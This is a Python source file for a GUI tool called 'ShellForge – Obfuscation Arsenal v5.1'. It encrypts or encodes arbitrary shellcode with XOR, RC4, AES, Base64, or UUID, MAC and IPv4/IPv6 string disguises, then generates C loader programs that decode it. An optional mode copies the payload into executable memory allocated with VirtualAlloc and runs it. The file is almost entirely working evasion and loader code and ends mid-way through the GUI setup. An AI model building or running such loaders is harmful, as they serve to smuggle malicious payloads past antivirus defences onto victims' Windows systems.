#!/usr/bin/env python3
"""
ShellForge – Obfuscation Arsenal v5.1
Generate C code that decrypts/decodes shellcode and prints it in hex.
Optionally executes the shellcode on Windows (VirtualAlloc).
"""

import os
import socket
import re
import hashlib
import binascii
import base64
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, Menu, simpledialog

# Try to import pycryptodome (required for AES)
try:
    from Crypto.Cipher import AES as pyAES
    from Crypto.Util.Padding import pad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

def xor_encrypt(data, key=None):
    if key is None:
        key = os.urandom(4)
    encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    return encrypted, key

def complex_xor_encrypt(data, key=None):
    if key is None:
        key = os.urandom(16)
    encrypted = bytearray()
    prev = 0
    for i, b in enumerate(data):
        k = key[i % len(key)]
        val = b ^ k ^ prev
        encrypted.append(val)
        prev = val
    return bytes(encrypted), key

def rc4_encrypt(data, key=None):
    if key is None:
        key = os.urandom(16)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append(byte ^ k)
    return bytes(out), key

def aes_encrypt(data, key=None, iv=None):
    if not CRYPTO_AVAILABLE:
        raise RuntimeError("pycryptodome is required for AES.")
    if key is None:
        key = os.urandom(16)
    if iv is None:
        iv = os.urandom(16)
    cipher = pyAES.new(key, pyAES.MODE_CBC, iv)
    padded = pad(data, pyAES.block_size)
    encrypted = cipher.encrypt(padded)
    return encrypted, key, iv

def base64_encode(data):
    return base64.b64encode(data).decode('ascii')

def uuid_encode(data):
    if len(data) % 16 != 0:
        data += b'\x00' * (16 - (len(data) % 16))
    uuids = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        data1 = int.from_bytes(chunk[0:4], byteorder='little')
        data2 = int.from_bytes(chunk[4:6], byteorder='little')
        data3 = int.from_bytes(chunk[6:8], byteorder='little')
        data4 = chunk[8:16]
        part4 = data4[0:2]
        part5 = data4[2:8]
        uuid_str = f"{data1:08x}-{data2:04x}-{data3:04x}-{part4.hex()}-{part5.hex()}"
        uuids.append(uuid_str.upper())
    return uuids

def mac_encode(data):
    if len(data) % 6 != 0:
        data += b'\x00' * (6 - (len(data) % 6))
    macs = []
    for i in range(0, len(data), 6):
        chunk = data[i:i+6]
        mac = ':'.join(f'{b:02X}' for b in chunk)
        macs.append(mac)
    return macs

def ipv4_encode(data):
    if len(data) % 4 != 0:
        data += b'\x00' * (4 - (len(data) % 4))
    ips = []
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        ip = socket.inet_ntoa(chunk)
        ips.append(ip)
    return ips

def ipv6_encode(data):
    if len(data) % 16 != 0:
        data += b'\x00' * (16 - (len(data) % 16))
    ips = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        ip = socket.inet_ntop(socket.AF_INET6, chunk)
        ips.append(ip)
    return ips

# ------------------------------------------------------------
# C array generators (multi-line)
# ------------------------------------------------------------
def c_array(name, data, columns=16):
    hex_bytes = [f'0x{b:02X}' for b in data]
    lines = []
    for i in range(0, len(hex_bytes), columns):
        chunk = hex_bytes[i:i+columns]
        lines.append('    ' + ', '.join(chunk))
    array_body = ',\n'.join(lines)
    return f'unsigned char {name}[] = {{\n{array_body}\n}};'

def c_string_array(name, strings):
    elements = ''.join(f'    "{s}",\n' for s in strings)
    return f'const char* {name}[] = {{\n{elements}}};'

# ------------------------------------------------------------
# Common code snippets for generated C
# ------------------------------------------------------------
def print_hex_line(buf_name, size_name):
    return f'''
    printf("Decrypted shellcode (%zu bytes):\\n", {size_name});
    for (size_t i = 0; i < {size_name}; i++) printf("%02X ", {buf_name}[i]);
    printf("\\n");
'''

def execute_shellcode_windows(buf_name, size_name):
    return f'''
    // Allocate executable memory and run the shellcode
    unsigned char* exec_buf = (unsigned char*)VirtualAlloc(NULL, {size_name}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_buf) {{
        memcpy(exec_buf, {buf_name}, {size_name});
        ((void(*)())exec_buf)();
        VirtualFree(exec_buf, 0, MEM_RELEASE);
    }}
'''

# ------------------------------------------------------------
# C code generators – simple, no compression
# ------------------------------------------------------------
def generate_xor_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(4)
    encrypted, _ = xor_encrypt(shellcode, key)
    size = len(encrypted)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char xor_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_array("encrypted", encrypted)}
#define ENCRYPTED_LEN {size}

void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}}

int main() {{
    xor_decrypt(encrypted, ENCRYPTED_LEN, xor_key, sizeof(xor_key));
{print_hex_line("encrypted", "ENCRYPTED_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("encrypted", "ENCRYPTED_LEN")
    code += """
    return 0;
}
"""
    return code

def generate_complex_xor_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(16)
    encrypted, _ = complex_xor_encrypt(shellcode, key)
    size = len(encrypted)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char xor_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_array("encrypted", encrypted)}
#define ENCRYPTED_LEN {size}

void complex_xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    unsigned char prev = 0;
    for (size_t i = 0; i < len; i++) {{
        unsigned char dec = data[i] ^ key[i % key_len] ^ prev;
        prev = data[i];
        data[i] = dec;
    }}
}}

int main() {{
    complex_xor_decrypt(encrypted, ENCRYPTED_LEN, xor_key, sizeof(xor_key));
{print_hex_line("encrypted", "ENCRYPTED_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("encrypted", "ENCRYPTED_LEN")
    code += """
    return 0;
}
"""
    return code

def generate_rc4_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(16)
    encrypted, _ = rc4_encrypt(shellcode, key)
    size = len(encrypted)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char rc4_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_array("encrypted", encrypted)}
#define ENCRYPTED_LEN {size}

void rc4_crypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % key_len]) & 0xFF;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }}
    int i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {{
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        unsigned char k = S[(S[i] + S[j]) & 0xFF];
        data[n] ^= k;
    }}
}}

int main() {{
    rc4_crypt(encrypted, ENCRYPTED_LEN, rc4_key, sizeof(rc4_key));
{print_hex_line("encrypted", "ENCRYPTED_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("encrypted", "ENCRYPTED_LEN")
    code += """
    return 0;
}
"""
    return code

def generate_aes_c(shellcode, custom_key=None, custom_iv=None, execute=False):
    if not CRYPTO_AVAILABLE:
        return "ERROR: pycryptodome not installed."
    key = custom_key if custom_key else os.urandom(16)
    iv = custom_iv if custom_iv else os.urandom(16)
    encrypted, _, _ = aes_encrypt(shellcode, key, iv)
    size = len(encrypted)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include \"aes.h\"" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char aes_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
unsigned char aes_iv[] = {{ {', '.join(f'0x{b:02X}' for b in iv)} }};
{c_array("encrypted", encrypted)}
#define ENCRYPTED_LEN {size}

int main() {{
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, encrypted, ENCRYPTED_LEN);
{print_hex_line("encrypted", "ENCRYPTED_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("encrypted", "ENCRYPTED_LEN")
    code += """
    return 0;
}
"""
    return code

# ------------------------------------------------------------
# Encoding-only techniques
# ------------------------------------------------------------
def generate_uuid_c(shellcode, execute=False):
    uuids = uuid_encode(shellcode)
    padded_len = len(uuids) * 16
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <rpc.h>" + \
              ("\n#include <windows.h>" if execute else "")
    code = f'''{headers}

{c_string_array("uuid_strings", uuids)}
#define NUM_UUIDS {len(uuids)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

int main() {{
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_UUIDS; i++) {{
        UUID uuid;
        if (UuidFromStringA((RPC_CSTR)uuid_strings[i], &uuid) != RPC_S_OK) {{
            printf("Failed to parse UUID\\n");
            return 1;
        }}
        memcpy(ptr, &uuid, 16);
        ptr += 16;
    }}
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_mac_c(shellcode, execute=False):
    macs = mac_encode(shellcode)
    padded_len = len(macs) * 6
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>" + \
              ("\n#include <windows.h>" if execute else "")
    code = f'''{headers}

{c_string_array("mac_strings", macs)}
#define NUM_MACS {len(macs)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

void mac_to_bytes(const char* mac, unsigned char* out) {{
    sscanf(mac, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
           &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
}}

int main() {{
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_MACS; i++) {{
        mac_to_bytes(mac_strings[i], ptr);
        ptr += 6;
    }}
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_ipv4_c(shellcode, execute=False):
    ips = ipv4_encode(shellcode)
    padded_len = len(ips) * 4
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#pragma comment(lib, \"ws2_32.lib\")" + \
              ("\n#include <windows.h>" if execute else "")
    code = f'''{headers}

{c_string_array("ip_strings", ips)}
#define NUM_IPS {len(ips)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

int main() {{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_IPS; i++) {{
        struct in_addr addr;
        inet_pton(AF_INET, ip_strings[i], &addr);
        memcpy(ptr, &addr, 4);
        ptr += 4;
    }}
    WSACleanup();
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_ipv6_c(shellcode, execute=False):
    ips = ipv6_encode(shellcode)
    padded_len = len(ips) * 16
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#pragma comment(lib, \"ws2_32.lib\")" + \
              ("\n#include <windows.h>" if execute else "")
    code = f'''{headers}

{c_string_array("ipv6_strings", ips)}
#define NUM_IPS {len(ips)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

int main() {{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_IPS; i++) {{
        struct in6_addr addr;
        inet_pton(AF_INET6, ipv6_strings[i], &addr);
        memcpy(ptr, &addr, 16);
        ptr += 16;
    }}
    WSACleanup();
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

# ------------------------------------------------------------
# Combined techniques
# ------------------------------------------------------------
def generate_combined_rc4_uuid_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(16)
    encrypted, _ = rc4_encrypt(shellcode, key)
    uuids = uuid_encode(encrypted)
    padded_len = len(encrypted) + (16 - len(encrypted) % 16) % 16
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <rpc.h>" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char rc4_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_string_array("uuid_strings", uuids)}
#define NUM_UUIDS {len(uuids)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

void rc4_crypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % key_len]) & 0xFF;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }}
    int i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {{
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        unsigned char k = S[(S[i] + S[j]) & 0xFF];
        data[n] ^= k;
    }}
}}

int main() {{
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_UUIDS; i++) {{
        UUID uuid;
        if (UuidFromStringA((RPC_CSTR)uuid_strings[i], &uuid) != RPC_S_OK) {{
            printf("Failed to parse UUID\\n");
            return 1;
        }}
        memcpy(ptr, &uuid, 16);
        ptr += 16;
    }}
    rc4_crypt(buf, PADDED_LEN, rc4_key, sizeof(rc4_key));
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_combined_aes_uuid_c(shellcode, custom_key=None, custom_iv=None, execute=False):
    if not CRYPTO_AVAILABLE:
        return "ERROR: pycryptodome not installed."
    key = custom_key if custom_key else os.urandom(16)
    iv = custom_iv if custom_iv else os.urandom(16)
    encrypted, _, _ = aes_encrypt(shellcode, key, iv)
    uuids = uuid_encode(encrypted)
    padded_len = len(encrypted) + (16 - len(encrypted) % 16) % 16
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <rpc.h>\n#include \"aes.h\"" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char aes_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
unsigned char aes_iv[] = {{ {', '.join(f'0x{b:02X}' for b in iv)} }};
{c_string_array("uuid_strings", uuids)}
#define NUM_UUIDS {len(uuids)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

int main() {{
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_UUIDS; i++) {{
        UUID uuid;
        if (UuidFromStringA((RPC_CSTR)uuid_strings[i], &uuid) != RPC_S_OK) {{
            printf("Failed to parse UUID\\n");
            return 1;
        }}
        memcpy(ptr, &uuid, 16);
        ptr += 16;
    }}
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, buf, PADDED_LEN);
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_combined_xor_base64_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(4)
    encrypted, _ = xor_encrypt(shellcode, key)
    b64 = base64_encode(encrypted)
    size = len(encrypted)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include \"base64.h\"" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char xor_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
const char* b64_encoded = "{b64}";
#define ENCRYPTED_LEN {size}

void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}}

int main() {{
    size_t enc_len;
    unsigned char* enc = base64_decode(b64_encoded, &enc_len);
    if (!enc) return 1;
    xor_decrypt(enc, enc_len, xor_key, sizeof(xor_key));
{print_hex_line("enc", "enc_len")}
'''
    if execute:
        code += execute_shellcode_windows("enc", "enc_len")
    code += "    free(enc);\n    return 0;\n}\n"
    return code

def generate_combined_xor_ipv4_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(4)
    encrypted, _ = xor_encrypt(shellcode, key)
    ips = ipv4_encode(encrypted)
    padded_len = len(encrypted) + (4 - len(encrypted) % 4) % 4
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#pragma comment(lib, \"ws2_32.lib\")" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char xor_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_string_array("ip_strings", ips)}
#define NUM_IPS {len(ips)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}}

int main() {{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_IPS; i++) {{
        struct in_addr addr;
        inet_pton(AF_INET, ip_strings[i], &addr);
        memcpy(ptr, &addr, 4);
        ptr += 4;
    }}
    WSACleanup();
    xor_decrypt(buf, PADDED_LEN, xor_key, sizeof(xor_key));
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_combined_xor_ipv6_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(4)
    encrypted, _ = xor_encrypt(shellcode, key)
    ips = ipv6_encode(encrypted)
    padded_len = len(encrypted) + (16 - len(encrypted) % 16) % 16
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#pragma comment(lib, \"ws2_32.lib\")" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char xor_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_string_array("ipv6_strings", ips)}
#define NUM_IPS {len(ips)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

void xor_decrypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}}

int main() {{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_IPS; i++) {{
        struct in6_addr addr;
        inet_pton(AF_INET6, ipv6_strings[i], &addr);
        memcpy(ptr, &addr, 16);
        ptr += 16;
    }}
    WSACleanup();
    xor_decrypt(buf, PADDED_LEN, xor_key, sizeof(xor_key));
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_combined_aes_ipv6_c(shellcode, custom_key=None, custom_iv=None, execute=False):
    if not CRYPTO_AVAILABLE:
        return "ERROR: pycryptodome not installed."
    key = custom_key if custom_key else os.urandom(16)
    iv = custom_iv if custom_iv else os.urandom(16)
    encrypted, _, _ = aes_encrypt(shellcode, key, iv)
    ips = ipv6_encode(encrypted)
    padded_len = len(encrypted) + (16 - len(encrypted) % 16) % 16
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include \"aes.h\"\n#pragma comment(lib, \"ws2_32.lib\")" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char aes_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
unsigned char aes_iv[] = {{ {', '.join(f'0x{b:02X}' for b in iv)} }};
{c_string_array("ipv6_strings", ips)}
#define NUM_IPS {len(ips)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

int main() {{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_IPS; i++) {{
        struct in6_addr addr;
        inet_pton(AF_INET6, ipv6_strings[i], &addr);
        memcpy(ptr, &addr, 16);
        ptr += 16;
    }}
    WSACleanup();
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, buf, PADDED_LEN);
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

def generate_combined_rc4_mac_c(shellcode, custom_key=None, execute=False):
    key = custom_key if custom_key else os.urandom(16)
    encrypted, _ = rc4_encrypt(shellcode, key)
    macs = mac_encode(encrypted)
    padded_len = len(encrypted) + (6 - len(encrypted) % 6) % 6
    total_len = len(shellcode)
    headers = "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>" + \
              ("\n#include <windows.h>" if execute else "")

    code = f'''{headers}

unsigned char rc4_key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};
{c_string_array("mac_strings", macs)}
#define NUM_MACS {len(macs)}
#define PADDED_LEN {padded_len}
#define SHELLCODE_LEN {total_len}

void rc4_crypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {{
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % key_len]) & 0xFF;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }}
    int i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {{
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        unsigned char k = S[(S[i] + S[j]) & 0xFF];
        data[n] ^= k;
    }}
}}

void mac_to_bytes(const char* mac, unsigned char* out) {{
    sscanf(mac, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
           &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
}}

int main() {{
    unsigned char buf[PADDED_LEN];
    unsigned char* ptr = buf;
    for (int i = 0; i < NUM_MACS; i++) {{
        mac_to_bytes(mac_strings[i], ptr);
        ptr += 6;
    }}
    rc4_crypt(buf, PADDED_LEN, rc4_key, sizeof(rc4_key));
{print_hex_line("buf", "SHELLCODE_LEN")}
'''
    if execute:
        code += execute_shellcode_windows("buf", "SHELLCODE_LEN")
    code += "    return 0;\n}\n"
    return code

# ------------------------------------------------------------
# Syntax Highlighting
# ------------------------------------------------------------
class CustomText(tk.Text):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._highlight_after_id = None
        self.bind('<KeyRelease>', self.on_key_release)
        self.bind('<<Paste>>', self.on_paste)
        self.tag_config('keyword', foreground='#569CD6')
        self.tag_config('preproc', foreground='#9B9B9B')
        self.tag_config('comment', foreground='#6A9955')
        self.tag_config('string', foreground='#CE9178')
        self.tag_config('number', foreground='#B5CEA8')
        self.keywords = set("""
            auto break case char const continue default do double else enum extern
            float for goto if int long register return short signed sizeof static
            struct switch typedef union unsigned void volatile while
            #include #define #ifdef #ifndef #endif #pragma
            __declspec __stdcall __cdecl __fastcall __thiscall
            size_t uint8_t uint16_t uint32_t uint64_t int8_t int16_t int32_t int64_t
            BOOL DWORD HANDLE HMODULE LPVOID LPSTR LPCSTR
        """.split())

    def on_key_release(self, event=None):
        if self._highlight_after_id:
            self.after_cancel(self._highlight_after_id)
        self._highlight_after_id = self.after(300, self.highlight_syntax)

    def on_paste(self, event=None):
        self.after_idle(self.highlight_syntax)

    def highlight_syntax(self):
        for tag in self.tag_names():
            self.tag_remove(tag, '1.0', 'end')
        code = self.get('1.0', 'end-1c')
        if not code:
            return
        for match in re.finditer(r'"(?:[^"\\]|\\.)*"', code):
            s, e = match.span()
            self.tag_add('string', f'1.0+{s}c', f'1.0+{e}c')
        for match in re.finditer(r'//.*', code):
            s, e = match.span()
            self.tag_add('comment', f'1.0+{s}c', f'1.0+{e}c')
        for match in re.finditer(r'/\*.*?\*/', code, re.DOTALL):
            s, e = match.span()
            self.tag_add('comment', f'1.0+{s}c', f'1.0+{e}c')
        for match in re.finditer(r'^#.*', code, re.MULTILINE):
            s, e = match.span()
            self.tag_add('preproc', f'1.0+{s}c', f'1.0+{e}c')
        for match in re.finditer(r'\b0x[0-9a-fA-F]+\b|\b\d+\b', code):
            s, e = match.span()
            self.tag_add('number', f'1.0+{s}c', f'1.0+{e}c')
        for kw in self.keywords:
            for match in re.finditer(r'\b' + re.escape(kw) + r'\b', code):
                s, e = match.span()
                self.tag_add('keyword', f'1.0+{s}c', f'1.0+{e}c')

# ------------------------------------------------------------
# Main GUI Application – ShellForge (no compression)
# ------------------------------------------------------------
MAX_PREVIEW_CHARS = 100_000

class ShellcodeObfuscatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("ShellForge – Obfuscation Arsenal v5.1")
        self.root.geometry("1400x900")
        self.root.option_add('*tearOff', False)
        self.shellcode = None
        self.filename = tk.StringVar()
        self.last_dir = os.getcwd()
        style = ttk.Style()
        available_themes = style.theme_names()
        preferred = 'vista' if 'vista' in available_themes else 'clam' if 'clam' in available_themes else 'alt'
        style.theme_use(preferred)
        style.configure('TLabel', font=('Segoe UI', 10))
        style.configure('TButton', font=('Segoe UI', 10))
        style.configure('TFrame', background='#f0f0f0')
        style.configure('TLabelframe', background='#f0f0f0', font=('Segoe UI', 10, 'bold'))
        self.create_menu()
        self.create_widgets()
        self.update_status("Ready – Load shellcode and forge.")

    def create_menu(self):
        menubar = Menu(self.root)
        self.root.config(menu=menubar)
        file_menu = Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Load Binary", command=self.load_file, accelerator="Ctrl+O")
        file_menu.add_command(label="Load from Hex", command=self.load_hex)
        file_menu.add_separator()
        file_menu.add_command(label="Save Current Code", command=self.save_current_code, accelerator="Ctrl+S")
        file_menu.add_command(label="Export as...", command=self.export_as)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        edit_menu = Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Edit", menu=edit_menu)
        edit_menu.add_command(label="Copy Code", command=self.copy_current_code, accelerator="Ctrl+C")
        edit_menu.add_command(label="Clear Code", command=self.clear_current_code)
        edit_menu.add_separator()
        edit_menu.add_command(label="Randomize All Keys", command=self.randomize_all_keys)
        view_menu = Menu(menubar, tearoff=0)
        menubar.add_cascade(label="View", menu=view_menu)
        self.show_hex = tk.BooleanVar(value=True)
        view_menu.add_checkbutton(label="Hex Preview", variable=self.show_hex, command=self.toggle_hex_preview)
        help_menu = Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)
        self.root.bind('<Control-o>', lambda e: self.load_file())
        self.root.bind('<Control-s>', lambda e: self.save_current_code())
        self.root.bind('<Control-c>', lambda e: self.copy_current_code())

    def create_widgets(self):
        main_pane = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
        main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Left panel
        left_frame = ttk.Frame(main_pane, width=400)
        main_pane.add(left_frame, weight=1)

        # File selection
        file_frame = ttk.LabelFrame(left_frame, text="Input", padding=5)
        file_frame.pack(fill=tk.X, pady=5)
        ttk.Label(file_frame, text="Binary file:").grid(row=0, column=0, sticky='w', padx=2)
        ttk.Entry(file_frame, textvariable=self.filename).grid(row=0, column=1, sticky='ew', padx=2)
        ttk.Button(file_frame, text="Browse", command=self.load_file).grid(row=0, column=2, padx=2)
        file_frame.columnconfigure(1, weight=1)

        # Shellcode info
        info_frame = ttk.LabelFrame(left_frame, text="Shellcode Info", padding=5)
        info_frame.pack(fill=tk.X, pady=5)
